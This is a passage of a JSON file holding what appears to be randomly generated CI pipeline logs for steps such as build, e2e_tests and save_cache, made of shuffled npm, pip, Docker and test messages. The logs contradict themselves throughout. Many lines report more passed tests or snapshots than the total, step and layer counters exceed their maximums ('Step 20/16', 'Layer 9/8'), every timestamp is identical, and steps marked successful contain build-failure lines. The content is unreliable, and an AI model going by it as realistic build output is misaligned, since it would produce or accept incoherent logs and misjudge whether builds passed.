          "Coverage: 93% statements, 82% branches",
          "Installing express@3.13.5",
          "Snapshots: 19 passed, 18 total",
          "Artifact uploaded: build.tar.gz (28MB)",
          "[12:18:08] DEBUG: Memory usage: 1662MB",
          "Cache invalidated: build",
          "Connection established",
          "[12:18:08] INFO: Starting build process",
          "Checking out master branch",
          "yarn add: Done in 29.14s",
          "Platform: linux-x64",
          "Ready.",
          "pip: Collecting webpack",
          "[12:18:08] DEBUG: Query executed in 32ms",
          "OK",
          "Cache hit for key-1678",
          "[12:18:08] INFO: Cache refreshed",
          "Environment: production",
          "FAILED: test_user_create",
          "Step 3/15: Building",
          "Checking out main branch",
          "npm install: resolved 1226 packages",
          "Checking out main branch",
          "Checking out main branch",
          "Cache invalidated: node_modules",
          "Checking out master branch",
          "Checking out main branch",
          "[12:18:08] INFO: Starting build process",
          "Time: 24.902s",
          "Step 13/24: Testing",
          "Step 11/18: Deploying",
          "[12:18:08] WARN: Deprecated API usage",
          "[12:18:08] DEBUG: Query executed in 80ms",
          "Waiting...",
          "npm install: resolved 1612 packages",
          "pip: Downloading jest-4.16.tar.gz",
          "Compiling components/service.java...",
          "Pulling image: python:3.11",
          "\u2713 All checks passed",
          "Compiling utils/handler.rs...",
          "Checking out develop branch",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Using Node.js 14.16.10",
          "Completed.",
          "Step 16/16: Building",
          "Switched to branch 'bugfix/task-410'",
          "Cache invalidated: build",
          "NODE_ENV=development",
          "\u2713 All checks passed",
          "WARNING: axios has known vulnerabilities",
          "Step 12/25: Running migrations",
          "[12:18:08] DEBUG: Initializing service",
          "Pulling image: node:3.11",
          "[12:18:08] ERROR: Connection failed",
          "\u2713 Task completed in 3044ms",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Switched to branch 'feature/task-605'",
          "[12:18:08] WARN: Deprecated API usage",
          "Cache restored successfully (134MB)",
          "Exception: TypeError",
          "[12:18:08] INFO: Request completed",
          "Platform: linux-x64",
          "Step 8/20: Testing",
          "Image pulled successfully",
          "Platform: darwin-arm64",
          "Compiling components/handler.rs...",
          "Finished.",
          "Time: 27.130s",
          "[12:18:08] ERROR: Connection failed",
          "\u2717 build failed with exit code 19",
          "GET /status - 201 (38ms)",
          "Loading...",
          "Using Node.js 17.0.9",
          "Pushing to registry...",
          "npm notice: package.json updated",
          "[12:18:08] INFO: Request completed",
          "Step 5/21: Building",
          "[12:18:08] INFO: Processing request",
          "npm install: resolved 1501 packages",
          "[12:18:08] DEBUG: Connection pool: 2 active",
          "yarn add: Done in 26.68s",
          "Generating source maps...",
          "Using Node.js 20.11.8",
          "[12:18:08] DEBUG: Query executed in 100ms",
          "npm notice: created a lockfile",
          "Platform: linux-x64",
          "Verifying...",
          "[12:18:08] WARN: Deprecated API usage",
          "Ready.",
          "Loading...",
          "Processing...",
          "Loading...",
          "Cache miss for key-7293",
          "yarn add: Done in 20.23s",
          "Switched to branch 'bugfix/task-765'",
          "Finished.",
          "[12:18:08] INFO: Connecting to database",
          "Using Node.js 15.7.1",
          "pip install: Successfully installed eslint-1.15",
          "NODE_ENV=test",
          "NODE_ENV=development",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Optimizing 31 modules...",
          "[12:18:08] DEBUG: Loading configuration",
          "Transforming 197 files...",
          "Step 14/15: Deploying",
          "Compiling lib/handler.rs...",
          "Minifying main.js",
          "[12:18:08] DEBUG: Initializing service",
          "Completed.",
          "Finished.",
          "Checking out main branch",
          "Step 18/23: Installing dependencies",
          "POST /data - 202 (41ms)",
          "[12:18:08] INFO: Connecting to database",
          "Ran 75 tests in 52s",
          "Ran 155 tests in 35s",
          "Optimizing 53 modules...",
          "[12:18:08] INFO: Connecting to database",
          "npm install: added 227 packages",
          "pip install: Successfully installed prettier-5.12",
          "\u2713 All checks passed",
          "npm notice: package.json updated",
          "Already up to date.",
          "Platform: darwin-arm64",
          "[12:18:08] INFO: Connecting to database",
          "\u2713 All checks passed",
          "[12:18:08] INFO: Request completed",
          "npm install: added 475 packages",
          "Success!",
          "Using Python 3.9",
          "Layer 8/13: ENV command",
          "[12:18:08] DEBUG: Connection pool: 13 active",
          "Finished.",
          "[12:18:08] ERROR: Connection failed",
          "  PASS: e2e/test_api_health.spec.js",
          "\u2713 Task completed in 745ms",
          "[12:18:08] INFO: Connecting to database",
          "  PASS: test_auth_login (398ms)",
          "Uploading artifact 'dist' (1 files)",
          "Uploading artifact 'build' (26 files)",
          "Step 6/16: Installing dependencies",
          "Processing...",
          "Completed.",
          "Pulling image: node:3.11",
          "Cache saved successfully",
          "Compiling utils/app.ts...",
          "Step 6/15: Building",
          "[12:18:08] WARN: Deprecated API usage",
          "Platform: darwin-arm64",
          "Platform: win32-x64",
          "\u2713 Task completed in 574ms",
          "Tests: 161 passed, 196 total",
          "Loading...",
          "\u2713 Task completed in 3833ms",
          "Image pulled successfully",
          "Step 8/18: Installing dependencies",
          "Compiling lib/service.java...",
          "NODE_ENV=test",
          "Step 18/19: Testing",
          "Coverage: 74% statements, 74% branches",
          "Done.",
          "[12:18:08] INFO: Processing request",
          "Building Docker image...",
          "[12:18:08] INFO: Starting build process",
          "Loading...",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-28T12:19:08.652515",
        "finished_at": "2025-11-28T12:19:44.946637",
        "log_lines": [
          "=== Step: build ===",
          "Using Node.js 20.14.10",
          "Test Suites: 35 passed, 44 total",
          "pip: Installing build dependencies...",
          "Compiling src/main.py...",
          "Coverage: 83% statements, 71% branches",
          "\u2713 deploy completed",
          "\u2713 Task completed in 1318ms",
          "[12:18:08] WARN: Deprecated API usage",
          "Compiling lib/main.py...",
          "FAILED: test_auth_login",
          "Fetching submodules...",
          "[12:18:08] WARN: Deprecated API usage",
          "\u2713 Task completed in 3430ms",
          "Completed.",
          "Step 6/23: Linting",
          "[12:18:08] INFO: Processing request",
          "Step 19/25: Deploying",
          "Environment: production",
          "Fetching submodules...",
          "[12:18:08] INFO: Processing request",
          "\u2713 build completed",
          "Pushing to registry...",
          "HEAD is now at cea2bee",
          "Snapshots: 50 passed, 41 total",
          "Success!",
          "Step 18/23: Running migrations",
          "Step 10/15: Linting",
          "yarn add: Done in 17.64s",
          "[12:18:08] DEBUG: Initializing service",
          "Tests: 442 passed, 307 total",
          "[12:18:08] DEBUG: Query executed in 12ms",
          "WARNING: webpack has known vulnerabilities",
          "Checking out develop branch",
          "yarn add: Done in 1.35s",
          "[12:18:08] DEBUG: Query executed in 11ms",
          "GET /health - 200 (98ms)",
          "Artifact downloaded: 10MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:18:08] DEBUG: Memory usage: 1482MB",
          "[12:18:08] DEBUG: Loading configuration",
          "Transforming 692 files...",
          "Compiling utils/app.ts...",
          "Step 17/18: Deploying",
          "Test Suites: 47 passed, 45 total",
          "FAILED: test_db_connect",
          "Step 14/24: Linting",
          "[12:18:08] DEBUG: Initializing service",
          "Compiling src/service.java...",
          "WARNING: axios has known vulnerabilities",
          "WARNING: prettier has known vulnerabilities",
          "POST /data - 201 (441ms)",
          "Step 18/20: Running migrations",
          "NODE_ENV=test",
          "Cache hit for key-3739",
          "[12:18:08] ERROR: Connection failed",
          "\u2713 test completed",
          "Compiling lib/utils.go...",
          "Waiting...",
          "Installing jest@1.1.9",
          "\u2713 All checks passed",
          "Step 17/19: Building",
          "POST /upload - 201 (236ms)",
          "Artifact uploaded: dist.zip (20MB)",
          "pip: Downloading jest-5.9.tar.gz",
          "[12:18:08] DEBUG: Connection pool: 19 active",
          "Waiting...",
          "[12:18:08] INFO: Cache refreshed",
          "Compiling src/service.java...",
          "Step 14/20: Installing dependencies",
          "Optimizing 32 modules...",
          "Snapshots: 33 passed, 29 total",
          "GET /status - 201 (90ms)",
          "Checking out main branch",
          "Cache invalidated: dependencies",
          "[12:18:08] WARN: Deprecated API usage",
          "Completed.",
          "yarn add: Done in 19.3s",
          "Finished.",
          "[12:18:08] DEBUG: Memory usage: 1546MB",
          "Coverage: 98% statements, 88% branches",
          "Step 9/22: Running migrations",
          "Finished.",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Time: 74.299s",
          "Tests: 296 passed, 330 total",
          "Fetching submodules...",
          "[12:18:08] INFO: Request completed",
          "[12:18:08] DEBUG: Initializing service",
          "Verifying...",
          "[12:18:08] INFO: Starting build process",
          "Step 15/22: Deploying",
          "[12:18:08] INFO: Connecting to database",
          "Step 4/23: Deploying",
          "Image pulled successfully",
          "Step 13/20: Running migrations",
          "Exception: ValueError",
          "Compiling src/index.js...",
          "[12:18:08] INFO: Starting build process",
          "Bundling runtime.css",
          "Cache miss for key-5285",
          "Using Python 3.10",
          "Using Python 3.10",
          "Time: 67.444s",
          "Image pulled successfully",
          "WARNING: react has known vulnerabilities",
          "Layer 3/10: COPY command",
          "Ready.",
          "yarn add: Done in 9.44s",
          "Connection established",
          "Step 2/15: Installing dependencies",
          "npm notice: package.json updated",
          "npm install: resolved 828 packages",
          "[12:18:08] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "POST /api - 201 (241ms)",
          "HEAD is now at 1bdf22d",
          "Pushing to registry...",
          "[12:18:08] WARN: Deprecated API usage",
          "Environment: test",
          "npm install: added 448 packages",
          "Already up to date.",
          "Snapshots: 29 passed, 48 total",
          "Checking out main branch",
          "Uploading artifact 'build' (29 files)",
          "Bundling styles.js",
          "POST /api - 201 (14ms)",
          "pip: Collecting lodash",
          "Loading...",
          "Waiting...",
          "Already up to date.",
          "Connecting to cloud.services:443...",
          "[12:18:08] WARN: Deprecated API usage",
          "[12:18:08] INFO: Connecting to database",
          "HEAD is now at 2fe4b2b",
          "Finished.",
          "Image pulled successfully",
          "\u2717 build failed with exit code 25",
          "TLS handshake completed",
          "Optimizing 75 modules...",
          "WARNING: webpack has known vulnerabilities",
          "Cache invalidated: dependencies",
          "Connecting to acme.corp:443...",
          "  PASS: test_user_create (96ms)",
          "Pushing to registry...",
          "Exception: TypeError",
          "Installing axios@4.0.7",
          "  PASS: test_api_health (433ms)",
          "[12:18:08] ERROR: Connection failed",
          "pip: Downloading jest-3.18.tar.gz",
          "pip install: Successfully installed webpack-4.7",
          "Building Docker image...",
          "Using Python 3.9",
          "Step 9/18: Installing dependencies",
          "Image pulled successfully",
          "Verifying...",
          "POST /upload - 201 (26ms)",
          "Connecting to acme.corp:443...",
          "Minifying main.js",
          "pip: Downloading eslint-3.9.tar.gz",
          "[12:18:08] ERROR: Connection failed",
          "Using Python 3.11",
          "Image pulled successfully",
          "  PASS: test_db_connect (130ms)",
          "  PASS: test_cache_hit (255ms)",
          "[12:18:08] WARN: Deprecated API usage",
          "Test Suites: 13 passed, 46 total",
          "Step 20/16: Deploying",
          "pip: Installing build dependencies...",
          "Step 9/19: Running migrations",
          "NODE_ENV=development",
          "Building Docker image...",
          "Minifying vendor.js",
          "Connecting to example.com:443...",
          "Artifact downloaded: 7MB",
          "[12:18:08] DEBUG: Memory usage: 1765MB",
          "Completed.",
          "Building Docker image...",
          "\u2713 All checks passed",
          "Finished.",
          "[12:18:08] INFO: Cache refreshed",
          "OK",
          "Connecting to test.io:443...",
          "Step 12/16: Deploying",
          "[12:18:08] WARN: Deprecated API usage",
          "pip: Downloading lodash-1.0.tar.gz",
          "Creating production build...",
          "Cache restored successfully (469MB)",
          "Success!",
          "\u2713 deploy completed",
          "Uploading artifact 'build' (50 files)",
          "Ran 142 tests in 35s",
          "Connection established",
          "POST /data - 200 (35ms)",
          "Snapshots: 3 passed, 28 total",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-28T12:19:44.946637",
        "finished_at": "2025-11-28T12:19:57.044678",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "pip: Downloading lodash-4.6.tar.gz",
          "Connection established",
          "[12:18:08] INFO: Cache refreshed",
          "Completed.",
          "Optimizing 31 modules...",
          "[12:18:08] INFO: Cache refreshed",
          "[12:18:08] WARN: Deprecated API usage",
          "Step 9/21: Linting",
          "Cache restored successfully (168MB)",
          "Artifact uploaded: dist.zip (92MB)",
          "[12:18:08] INFO: Processing request",
          "Artifact downloaded: 43MB",
          "Cache miss for key-9456",
          "Compiling lib/index.js...",
          "Compiling lib/index.js...",
          "NODE_ENV=production",
          "Using Python 3.12",
          "Loading...",
          "Time: 75.689s",
          "Cache invalidated: build",
          "Transforming 940 files...",
          "TLS handshake completed",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Step 17/18: Building",
          "Already up to date.",
          "Step 20/17: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:18:08] INFO: Request completed",
          "Waiting...",
          "Step 5/25: Deploying",
          "\u2717 build failed with exit code 105",
          "Compiling components/main.py...",
          "WARNING: axios has known vulnerabilities",
          "yarn add: Done in 12.55s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ready.",
          "Pushing to registry...",
          "pip: Downloading react-5.7.tar.gz",
          "[12:18:08] INFO: Processing request",
          "Cache saved successfully",
          "Generating source maps...",
          "npm notice: created a lockfile",
          "Artifact uploaded: dist.zip (49MB)",
          "Step 14/24: Deploying",
          "Using Node.js 15.1.0",
          "pip: Collecting eslint",
          "Compiling lib/handler.rs...",
          "[12:18:08] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "Processing...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Test Suites: 22 passed, 5 total",
          "[12:18:08] DEBUG: Connection pool: 7 active",
          "Compiling lib/main.py...",
          "Processing...",
          "[12:18:08] DEBUG: Initializing service",
          "Success!",
          "Snapshots: 14 passed, 31 total",
          "Pulling image: alpine:latest",
          "[12:18:08] DEBUG: Query executed in 12ms",
          "Layer 8/13: COPY command",
          "Checking out master branch",
          "Loading...",
          "Cache restored successfully (312MB)",
          "[12:18:08] INFO: Processing request",
          "\u2717 build failed with exit code 56",
          "Loading...",
          "Artifact uploaded: dist.zip (25MB)",
          "Cache miss for key-1720",
          "\u2713 Step 'install' succeeded",
          "Done.",
          "Compiling utils/index.js...",
          "Pulling image: python:3.11",
          "Step 18/15: Linting",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Success!",
          "Fetching submodules...",
          "pip install: Successfully installed webpack-5.15",
          "Layer 9/8: ENV command",
          "Pushing to registry...",
          "Switched to branch 'hotfix/task-429'",
          "Done.",
          "[12:18:08] DEBUG: Connection pool: 15 active",
          "Compiling components/app.ts...",
          "Cache restored successfully (88MB)",
          "NODE_ENV=production",
          "npm notice: created a lockfile",
          "Ready.",
          "Waiting...",
          "Building Docker image...",
          "[12:18:08] DEBUG: Memory usage: 1435MB",
          "Generating source maps...",
          "Using Node.js 16.8.10",
          "[12:18:08] INFO: Connecting to database",
          "\u2713 Task completed in 1129ms",
          "Step 10/16: Installing dependencies",
          "\u2713 test completed",
          "WARNING: axios has known vulnerabilities",
          "Snapshots: 13 passed, 35 total",
          "[12:18:08] ERROR: Connection failed",
          "Compiling lib/app.ts...",
          "Layer 10/10: ENV command",
          "npm install: resolved 343 packages",
          "[12:18:08] WARN: Deprecated API usage",
          "Snapshots: 13 passed, 12 total",
          "Minifying main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Finished.",
          "Compiling components/app.ts...",
          "npm notice: created a lockfile",
          "Coverage: 99% statements, 78% branches",
          "pip: Collecting lodash",
          "  PASS: integration/test_user_create.spec.js",
          "Platform: win32-x64",
          "HEAD is now at df396e6",
          "Optimizing 73 modules...",
          "Finished.",
          "Finished.",
          "pip install: Successfully installed axios-3.19",
          "Compiling components/handler.rs...",
          "\u2713 Task completed in 4480ms",
          "\u2713 Step 'setup' succeeded",
          "Artifact downloaded: 5MB",
          "Success!",
          "Coverage: 80% statements, 93% branches",
          "Time: 87.922s",
          "Ran 75 tests in 15s",
          "[12:18:08] DEBUG: Connection pool: 8 active",
          "Compiling src/index.js...",
          "Creating production build...",
          "[12:18:08] DEBUG: Connection pool: 4 active",
          "Step 20/22: Testing",
          "Time: 105.426s",
          "Snapshots: 39 passed, 2 total",
          "GET /api - 204 (20ms)",
          "Exception: ValueError",
          "GET /health - 200 (77ms)",
          "Artifact downloaded: 23MB",
          "Layer 9/8: COPY command",
          "npm notice: created a lockfile",
          "[12:18:08] WARN: Deprecated API usage",
          "Generating source maps...",
          "npm install: resolved 168 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:18:08] INFO: Cache refreshed",
          "Step 19/25: Linting",
          "WARNING: lodash has known vulnerabilities",
          "Generating source maps...",
          "Already up to date.",
          "Uploading artifact 'coverage' (24 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Snapshots: 14 passed, 22 total",
          "[12:18:08] DEBUG: Initializing service",
          "Artifact downloaded: 37MB",
          "Test Suites: 38 passed, 37 total",
          "Tests: 83 passed, 434 total",
          "  PASS: test_db_connect (217ms)",
          "Test Suites: 44 passed, 42 total",
          "Verifying...",
          "Exception: NullPointerException",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Cache hit for key-9410",
          "GET /api - 200 (58ms)",
          "npm notice: created a lockfile",
          "Compiling utils/main.py...",
          "TLS handshake completed",
          "Platform: linux-x64",
          "\u2713 All checks passed",
          "pip install: Successfully installed express-5.0",
          "Ready.",
          "Compiling utils/utils.go...",
          "pip: Collecting react",
          "Processing...",
          "Transforming 648 files...",
          "Finished.",
          "Compiling lib/utils.go...",
          "Image pulled successfully",
          "Using Python 3.9",
          "Cache restored successfully (333MB)",
          "Using Python 3.11",
          "Environment: development",
          "Compiling lib/app.ts...",
          "Cache miss for key-9767",
          "Step 13/19: Deploying",
          "Transforming 712 files...",
          "Exception: ValueError",
          "Processing...",
          "Using Python 3.12",
          "[12:18:08] DEBUG: Initializing service",
          "Cache restored successfully (395MB)",
          "\u2717 build failed with exit code 24",
          "Using Node.js 14.13.5",
          "[12:18:08] DEBUG: Memory usage: 1072MB",
          "NODE_ENV=test",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-28T12:19:57.044678",
        "finished_at": "2025-11-28T12:20:04.303502",
        "log_lines": [
          "=== Step: save_cache ===",
          "Compiling utils/handler.rs...",
          "Done.",
          "Connection established",
          "Switched to branch 'hotfix/task-305'",
          "\u2713 Task completed in 4091ms",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: resolved 772 packages",
          "Using Node.js 17.14.8",
          "[12:18:08] DEBUG: Connection pool: 6 active",
          "Step 17/23: Installing dependencies",
          "[12:18:08] INFO: Connecting to database",
          "Uploading artifact 'build' (13 files)",
          "Loading...",
          "Done.",
          "Done.",
          "Creating production build...",
          "Platform: win32-x64",
          "Building Docker image...",
          "Building Docker image...",
          "Verifying...",
          "Completed.",
          "Transforming 527 files...",
          "[12:18:08] DEBUG: Query executed in 7ms",
          "Completed.",
          "Tests: 347 passed, 119 total",
          "Layer 1/10: RUN command",
          "Layer 7/10: RUN command",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Building Docker image...",
          "Connecting to test.io:443...",
          "\u2713 Step 'test' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 17/19: Linting",
          "[12:18:08] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Cache hit for key-3754",
          "Using Node.js 19.12.8",
          "Pushing to registry...",
          "Cache miss for key-3498",
          "Cache miss for key-3356",
          "Compiling src/index.js...",
          "Cache hit for key-5318",
          "Connection established",
          "WARNING: webpack has known vulnerabilities",
          "Step 20/22: Installing dependencies",
          "Compiling lib/app.ts...",
          "[12:18:08] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Tests: 119 passed, 339 total",
          "Already up to date.",
          "Cache miss for key-2544",
          "Time: 54.121s",
          "GET /health - 201 (12ms)",
          "WARNING: prettier has known vulnerabilities",
          "Step 2/16: Building",
          "Time: 35.408s",
          "[12:18:08] INFO: Cache refreshed",
          "GET /api - 204 (32ms)",
          "Step 15/19: Building",
          "Loading...",
          "WARNING: jest has known vulnerabilities",
          "[12:18:08] INFO: Starting build process",
          "[12:18:08] INFO: Connecting to database",
          "Step 8/16: Linting",
          "Step 5/16: Building",
          "Minifying vendor.js",
          "Bundling styles.js",
          "Compiling src/utils.go...",
          "Connection established",
          "Step 5/25: Installing dependencies",
          "Using Node.js 19.16.10",
          "[12:18:08] INFO: Request completed",
          "Installing lodash@3.8.2",
          "pip: Installing build dependencies...",
          "Cache miss for key-8719",
          "Checking out master branch",
          "[12:18:08] WARN: Deprecated API usage",
          "[12:18:08] INFO: Processing request",
          "[12:18:08] DEBUG: Memory usage: 1347MB",
          "Step 18/23: Installing dependencies",
          "Pushing to registry...",
          "[12:18:08] INFO: Request completed",
          "Generating source maps...",
          "Image pulled successfully",
          "Success!",
          "[12:18:08] DEBUG: Memory usage: 1584MB",
          "[12:18:08] WARN: Deprecated API usage",
          "npm install: added 30 packages",
          "Artifact uploaded: dist.zip (55MB)",
          "WARNING: express has known vulnerabilities",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 Task completed in 1458ms",
          "Pushing to registry...",
          "yarn add: Done in 27.82s",
          "Layer 2/9: ENV command",
          "Image pulled successfully",
          "Optimizing 44 modules...",
          "Step 1/19: Testing",
          "\u2713 Step 'setup' succeeded",
          "Layer 8/10: COPY command",
          "Checking out master branch",
          "WARNING: lodash has known vulnerabilities",
          "[12:18:08] DEBUG: Query executed in 57ms",
          "Compiling components/handler.rs...",
          "Fetching submodules...",
          "Image pulled successfully",
          "npm notice: created a lockfile",
          "Environment: test",
          "[12:18:08] INFO: Connecting to database",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-9057",
          "Finished.",
          "Cache saved successfully",
          "[12:18:08] INFO: Processing request",
          "  PASS: unit/test_cache_hit.spec.js",
          "pip install: Successfully installed axios-2.2",
          "Platform: darwin-arm64",
          "Coverage: 89% statements, 92% branches",
          "Pulling image: alpine:latest",
          "Step 1/25: Deploying",
          "Minifying vendor.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Snapshots: 5 passed, 33 total",
          "Compiling lib/service.java...",
          "FAILED: test_api_health",
          "Already up to date.",
          "Cache restored successfully (309MB)",
          "Step 14/24: Linting",
          "Platform: win32-x64",
          "Optimizing 81 modules...",
          "Cache saved successfully",
          "Bundling vendor.css",
          "Step 7/15: Installing dependencies",
          "Completed.",
          "Processing...",
          "[12:18:08] INFO: Cache refreshed",
          "HEAD is now at 53f2af2",
          "[12:18:08] DEBUG: Loading configuration",
          "HEAD is now at 2bb6e6a",
          "  PASS: e2e/test_auth_login.spec.js",
          "Transforming 494 files...",
          "Ran 91 tests in 3s",
          "Bundling styles.js",
          "Cache hit for key-1518",
          "Building Docker image...",
          "Bundling styles.css",
          "Pushing to registry...",
          "[12:18:08] DEBUG: Initializing service",
          "[12:18:08] DEBUG: Initializing service",
          "Cache invalidated: dependencies",
          "Already up to date.",
          "Step 4/25: Testing",
          "Loading...",
          "[12:18:08] INFO: Processing request",
          "Image pulled successfully",
          "Switched to branch 'hotfix/task-748'",
          "Installing webpack@1.20.0",
          "Using Node.js 16.11.7",
          "Loading...",
          "Cache saved successfully",
          "npm notice: package.json updated",
          "[12:18:08] INFO: Processing request",
          "Transforming 533 files...",
          "Step 4/25: Running migrations",
          "Image pulled successfully",
          "Cache hit for key-9231",
          "Building Docker image...",
          "Artifact uploaded: dist.zip (60MB)",
          "pip: Downloading lodash-2.8.tar.gz",
          "Transforming 701 files...",
          "[12:18:08] INFO: Connecting to database",
          "Processing...",
          "Cache saved successfully",
          "npm notice: created a lockfile",
          "Cache hit for key-8340",
          "Compiling src/main.py...",
          "[12:18:08] DEBUG: Loading configuration",
          "Compiling components/utils.go...",
          "HEAD is now at cb921f9",
          "Generating source maps...",
          "[12:18:08] INFO: Request completed",
          "Cache miss for key-7399",
          "Fetching submodules...",
          "Ready.",
          "Step 6/17: Linting",
          "Done.",
          "Done.",
          "Installing jest@3.19.2",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Verifying...",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-28T12:20:04.303502",
        "finished_at": "2025-11-28T12:20:16.401543",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Test Suites: 40 passed, 21 total",
          "Minifying vendor.js",
          "Step 11/18: Linting",
          "[12:18:08] ERROR: Connection failed",
          "Environment: development",
          "Already up to date.",
          "[12:18:08] INFO: Cache refreshed",
          "Cache hit for key-4250",
          "Installing jest@3.9.5",
          "Generating source maps...",
          "[12:18:08] DEBUG: Memory usage: 868MB",
          "Pushing to registry...",
          "npm install: resolved 869 packages",
          "Artifact downloaded: 50MB",
          "Verifying...",
          "Test Suites: 19 passed, 35 total",
          "OK",
          "[12:18:08] INFO: Request completed",
          "Building Docker image...",
          "[12:18:08] INFO: Connecting to database",
          "Already up to date.",
          "[12:18:08] INFO: Request completed",
          "Step 8/18: Linting",
          "Step 6/22: Deploying",
          "Layer 9/11: RUN command",
          "Test Suites: 47 passed, 37 total",
          "Verifying...",
          "Waiting...",
          "Exception: RuntimeError",
          "[12:18:08] WARN: Deprecated API usage",
          "Loading...",
          "pip: Downloading axios-5.10.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Optimizing 27 modules...",
          "Generating source maps...",
          "Using Node.js 18.15.5",
          "NODE_ENV=development",
          "Verifying...",
          "\u2713 test completed",
          "TLS handshake completed",
          "\u2713 package completed",
          "pip install: Successfully installed webpack-4.3",
          "[12:18:08] DEBUG: Connection pool: 7 active",
          "pip: Downloading express-2.18.tar.gz",
          "WARNING: webpack has known vulnerabilities",
          "Uploading artifact 'dist' (49 files)",
          "Artifact uploaded: dist.zip (35MB)",
          "npm notice: package.json updated",
          "NODE_ENV=production",
          "Step 8/18: Running migrations",
          "WARNING: express has known vulnerabilities",
          "Step 18/16: Deploying",
          "Already up to date.",
          "Artifact uploaded: dist.zip (76MB)",
          "OK",
          "Uploading artifact 'dist' (30 files)",
          "Building Docker image...",
          "Already up to date.",
          "npm install: added 71 packages",
          "Switched to branch 'hotfix/task-514'",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "WARNING: prettier has known vulnerabilities",
          "Step 12/21: Installing dependencies",
          "Compiling src/index.js...",
          "Tests: 482 passed, 206 total",
          "[12:18:08] DEBUG: Loading configuration",
          "Compiling src/handler.rs...",
          "yarn add: Done in 27.13s",
          "Step 1/19: Installing dependencies",
          "Cache invalidated: dependencies",
          "Bundling runtime.js",
          "Optimizing 42 modules...",
          "Installing react@5.2.0",
          "pip: Downloading axios-1.15.tar.gz",
          "npm install: resolved 816 packages",
          "[12:18:08] ERROR: Connection failed",
          "POST /api - 200 (112ms)",
          "Step 4/19: Deploying",
          "Pulling image: alpine:18",
          "Uploading artifact 'dist' (25 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:18:08] INFO: Cache refreshed",
          "Switched to branch 'feature/task-812'",
          "Coverage: 77% statements, 89% branches",
          "pip: Downloading express-4.8.tar.gz",
          "pip install: Successfully installed react-3.9",
          "[12:18:08] DEBUG: Memory usage: 984MB",
          "pip: Collecting express",
          "yarn add: Done in 28.60s",
          "Already up to date.",
          "[12:18:08] DEBUG: Loading configuration",
          "Compiling lib/main.py...",
          "pip: Collecting webpack",
          "Compiling src/service.java...",
          "\u2713 Task completed in 1431ms",
          "[12:18:08] ERROR: Connection failed",
          "Installing lodash@2.15.6",
          "Time: 19.408s",
          "WARNING: axios has known vulnerabilities",
          "Processing...",
          "Compiling components/handler.rs...",
          "[12:18:08] DEBUG: Connection pool: 14 active",
          "Cache invalidated: dependencies",
          "Test Suites: 24 passed, 39 total",
          "[12:18:08] DEBUG: Loading configuration",
          "Installing express@1.7.4",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:18:08] ERROR: Connection failed",
          "Uploading artifact 'dist' (20 files)",
          "\u2717 build failed with exit code 41",
          "Cache saved successfully",
          "Step 6/16: Installing dependencies",
          "Switched to branch 'feature/task-433'",
          "\u2713 All checks passed",
          "Step 4/18: Installing dependencies",
          "\u2713 All checks passed",
          "Ran 171 tests in 54s",
          "NODE_ENV=production",
          "WARNING: react has known vulnerabilities",
          "Completed.",
          "Loading...",
          "\u2713 All checks passed",
          "Platform: linux-x64",
          "[12:18:08] DEBUG: Memory usage: 1061MB",
          "Layer 1/8: ENV command",
          "Loading...",
          "Transforming 409 files...",
          "pip: Downloading express-2.15.tar.gz",
          "Checking out main branch",
          "[12:18:08] DEBUG: Memory usage: 1278MB",
          "pip install: Successfully installed axios-3.18",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Finished.",
          "[12:18:08] INFO: Cache refreshed",
          "Time: 3.508s",
          "Layer 6/8: ENV command",
          "Cache saved successfully",
          "Snapshots: 33 passed, 18 total",
          "[12:18:08] INFO: Request completed",
          "npm install: added 322 packages",
          "[12:18:08] DEBUG: Connection pool: 14 active",
          "Cache hit for key-3913",
          "Image pulled successfully",
          "Cache invalidated: build",
          "npm install: resolved 708 packages",
          "npm install: resolved 1088 packages",
          "[12:18:08] INFO: Request completed",
          "Switched to branch 'bugfix/task-441'",
          "\u2713 Task completed in 3459ms",
          "WARNING: jest has known vulnerabilities",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:18:08] WARN: Deprecated API usage",
